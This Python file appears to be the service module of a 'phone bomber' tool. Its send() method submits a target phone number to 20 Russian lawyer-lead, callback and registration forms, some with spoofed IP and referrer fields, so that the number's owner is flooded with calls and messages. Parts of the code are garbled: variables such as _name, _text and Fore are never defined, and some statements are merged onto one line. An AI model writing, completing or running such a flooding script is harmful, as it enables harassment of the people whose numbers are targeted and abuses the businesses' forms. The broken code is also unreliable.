import requests, random, datetime 
class Calls(object):
    
    all = 20
    author = "база от Gord1402 "
    
    def __init__(self):
        pass

    def send(self, serv, _phone):
        text =  "" 
        _email = ''
        for x in range(12):
            _email = _email + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))        _phoneVodaonline = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7 (999) 666-99-33'
        _phoneBukvaprava = _phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '7(777)777-77-77
        if serv == 1:requests.post('https://www.vodaonline.ru/local/components/shantilab/feedback.form/ajax.php', data={'sessid': '*', 'NAME': _name, 'PHONE': _phoneVodaonline})
        elif serv == 2:requests.post('https://yur-moscow.ru/ajax_call_me.php', data={'param1': _phone, 'param3': _text, 'param2': _name})
        elif serv == 3: requests.post('https://bukvaprava.ru/wp-admin/admin-ajax.php', data={'text_quest_banner': _text,'name': _name,'city':'Москва','tel': _phoneBukvaprava,'ip':'192.168.1.777','form_page':'https://bukvaprava.ru/','referer':'','action':'ajax-lead'})
        elif serv == 4: requests.post('https://www.yurist-online.net/lead_question', data={'region':'27','question': _text,'name': _name,'phone': _phone,'email':'','partner_id':'13'})
        elif serv == 5: requests.post('http://xn----8sbgev0cabfflr7k.xn--p1ai/scripts/form-u22118.php', data={'custom_U22127':_phoneVodaonline})
        elif serv == 6:requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php', data={'phone': '+'+_phone,'name': _name,'sid': '*','gclid': '0','openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium','utm':''})
        elif serv == 7: requests.post('https://rossovet.ru/qa/msgsave/save', data={'name': _name, 'comment': _text, 'city': 'Москва', 'phoneprefix': '('+_phone[1:4]+')', 'phone': _phone[4:11], 'partnerID': '10', 'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8', 'checkcode': '15'})
        elif serv == 8: requests.post('https://yuridicheskaya-konsultaciya.com/Home/_FormPost', data={'Name': _name, 'Phone': _phone, 'Description': _text})
        elif serv == 9: requests.post('https://epleads.ru/gate/api.php', data={'question': _text,'region': 'Москва','first_last_name': _name,'phone': _phone,'ofrid': '1','wid': '3','presetid': '4','referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html','ip': '213.154.55.496','mobile': '0','template': 'form_master.new.fix.metrik_lawyer-blue-default','product': 'lawyer','userSoftData': '*'})
        elif serv == 10: requests.post('https://pravonedv.ru/proxy_8d34201a5b.php?a___=1', data={'email': _email+'@mail.ru','phone': _phoneVodaonline,'location': 'Москва, Россия','name': _name,'offer': '0','ip': '263.87.162.98','device': 'desktop','token': '*','template': 'two_page3','referrer': 'https://yandex.ru/clck/','domain': 'pravonedv.ru','wm_id': '548','url': 'https://pravonedv.ru/besplatnye-onlajn-konsultacii-yurista'})
        elif serv == 11: requests.post('https://xn----etbqwledi5fza.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/295/feedback', data={'_wpcf7': '295','_wpcf7_version': '5.0.5','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f295-o2','_wpcf7_container_post': '0','text-838': _name,'tel-231': _phone,'textarea-472': _text,'hidden-278': 'Главная'})
        elif serv == 12: requests.post('http://www.gurist.ru/wp-json/contact-form-7/v1/contact-forms/3591/feedback', data={'_wpcf7': '3591','_wpcf7_version': '5.0','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f3591-o1','_wpcf7_container_post': '0','your-name': _name,'tel-147': _text})
        elif serv == 13: requests.post('https://moskva.beeline.ru/customers/products/mobile/services/createmnporder/', data={'leadName':'PodborSim','phone':_phone[1:11],'region':'98140'})        elif serv == 14: requests.post('https://advokatmakeev.ru/form.php', data={'oname': _name,'otel': _phoneVodaonline,'omail': '','omess': _text,'otype': '1'})
        elif serv == 15: requests.post('http://mkamsk.ru/apply_auto_form', data={'Form[9]': _name,'Form[12]': _phone,'Form[11]': _text,'url': 'http://mkamsk.ru/','check': 'check'})                print(Fore.GREEN + 'mkamsk.ru: отправлено')
        elif serv == 16: requests.post('https://usachev.vip/wp-admin/admin-ajax.php', data={'action': 'bazz_widget_action','phone': '+'+_phone,'name': ''})
        elif serv == 17: requests.post('http://pravo-sfera.ru/auxpage_zayavk/', data={'c_name': _name, 'c_tel' : _phoneVodaonline, 'quest': _text, 'uest_go': 'Задать вопрос'})
        elif serv == 18: requests.post('https://urist-expert24.ru/send-lead/', data={'name': _name, 'phone': _phoneVodaonline, 'form-name': 'Заказ обратного звонка'})
        elif serv == 19: requests.post('http://law-divorce.ru/wp-admin/admin-ajax.php', data={'ip_address': '','ip_country': '','ip_region': '','ip_city': '','url': '','action': 'lld_send_lead','text': _text,'name': _name,'telephone': '+'+_phoneBukvaprava,'city': 'Москва'})
        elif serv == 20: requests.get('https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
        else:raise 
